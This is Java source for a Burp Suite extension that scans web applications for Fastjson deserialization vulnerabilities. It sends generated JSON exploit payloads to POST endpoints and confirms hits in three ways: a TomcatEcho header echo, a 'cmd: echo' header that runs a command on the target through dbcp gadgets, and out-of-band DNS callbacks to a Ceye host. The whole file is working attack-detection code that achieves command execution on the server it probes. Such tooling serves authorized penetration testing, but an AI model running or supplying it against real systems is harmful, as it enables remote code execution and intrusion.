package burp.ScanFun;

import burp.*;
import burp.Listen.Ceye;

import java.io.UnsupportedEncodingException;
import java.nio.charset.StandardCharsets;
import java.util.Iterator;
import java.util.List;

public class FastJsonScan {


    public static IHttpRequestResponse FastjsonScan(IHttpRequestResponse baseRequestResponse, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers) throws UnsupportedEncodingException {
        if (baseRequestResponse.getRequest() != null) {
            IRequestInfo analyzeRequest = helpers.analyzeRequest(baseRequestResponse);
            List<String> headers = helpers.analyzeRequest(baseRequestResponse).getHeaders();
            String reqMethod = helpers.analyzeRequest(baseRequestResponse).getMethod();
            String host = baseRequestResponse.getHttpService().getHost();

            String newhost = "fjson"+GenPoc.Makenewhost(host);
            //BurpExtender.stdout.println(newhost);
            //对消息体进行解析,messageInfo是整个HTTP请求和响应消息体的总和，各种HTTP相关信息的获取都来自于它，HTTP流量的修改都是围绕它进行的。

            /*****************获取参数**********************/

            if (reqMethod.toLowerCase().equals("post")) {
                headers = helpers.analyzeRequest(baseRequestResponse).getHeaders();
                boolean json = false;
                boolean multipart = true;
                String Contenttype = Byte.toString(helpers.analyzeRequest(baseRequestResponse).getContentType());
                //BurpExtender.stdout.println(Contenttype);
                for (String header : headers
                ) {
                    if (header.contains("application/json")) {
                        json = true;
                    }
                    if (header.contains("multipart/form-data")) {
                        multipart = false;
                    }
                }
                //BurpExtender.stdout.println("到这里了");

                if (json && multipart) {
                    Ceye ceye = new Ceye();
                    List<String> pocs = GenPoc.GenFastJsonPoc(host);
                    int start = helpers.analyzeRequest(baseRequestResponse.getRequest()).getBodyOffset();
                    byte[] srcbody = baseRequestResponse.getRequest();
                    byte[] reqbody = Common.getpostParams(start, srcbody);
                    for (String poc : pocs) {
                        //echo
                        if(poc.contains("unpooled.UnpooledDataSource"))
                        {
                            int a = (int)((Math.random() * 9.0 + 1.0) * 100000.0);
                            List<String> echoheaders=helpers.analyzeRequest(baseRequestResponse).getHeaders();
                            echoheaders.add("Testecho:" + a);
                            byte[] body = helpers.buildHttpMessage(echoheaders, poc.getBytes(StandardCharsets.UTF_8));
                            IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                            if(requestResponse!=null && requestResponse.getResponse()!=null)
                            {
                                byte[] response = requestResponse.getResponse();
                                IResponseInfo responseInfo = helpers.analyzeResponse(response);
                                List respHeaders = responseInfo.getHeaders();
                                Iterator hd = respHeaders.iterator();

                                while(hd.hasNext()) {
                                    String h = (String)hd.next();
                                    if (h.contains(Integer.toString(a))) {
                                        //String mes = "find fastjson =< 1.2.47 Deserialization vulnerability(TomcatEcho)";
                                        return requestResponse;
                                    }
                                }
                            }
                        }
                        else if(poc.contains("dbcp.dbcp2"))
                        {
                            int a = (int)((Math.random() * 9.0 + 1.0) * 100000.0);
                            List<String> echoheaders=helpers.analyzeRequest(baseRequestResponse).getHeaders();
                            echoheaders.add("cmd: echo " + a);
                            byte[] body = helpers.buildHttpMessage(echoheaders, poc.getBytes(StandardCharsets.UTF_8));
                            IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                            if(requestResponse!=null && requestResponse.getResponse()!=null)
                            {
                                if(Common.getResbody(requestResponse.getResponse(),helpers).contains(Integer.toString(a)))
                                {

                                        //String mes = "find fastjson =< 1.2.47 Deserialization vulnerability(TomcatEcho)";
                                        return requestResponse;

                                }
                            }
                        }
                        else if(poc.contains("dbcp.dbcp"))
                        {
                            int a = (int)((Math.random() * 9.0 + 1.0) * 100000.0);
                            List<String> echoheaders=helpers.analyzeRequest(baseRequestResponse).getHeaders();
                            echoheaders.add("cmd: echo " + a);
                            byte[] body = helpers.buildHttpMessage(echoheaders, poc.getBytes(StandardCharsets.UTF_8));
                            IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                            if(requestResponse!=null && requestResponse.getResponse()!=null)
                            {
                                if(Common.getResbody(requestResponse.getResponse(),helpers).contains(Integer.toString(a)))
                                {

                                    //String mes = "find fastjson =< 1.2.47 Deserialization vulnerability(TomcatEcho)";
                                    return requestResponse;

                                }
                            }
                        }
                        else {
                            //BurpExtender.stdout.println(baseRequestResponse.getHttpService().getHost() + "的请求json数据为" + poc);
                            byte[] body = helpers.buildHttpMessage(headers, poc.getBytes(StandardCharsets.UTF_8));
                            IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                            if (ceye.CheckResult(newhost + ceye.getNewPayload())) {
                                return requestResponse;
                            }

                        }
                        //BurpExtender.stdout.println(reqbodystr);
                    }
                }

            }
        }
        return null;
    }
}
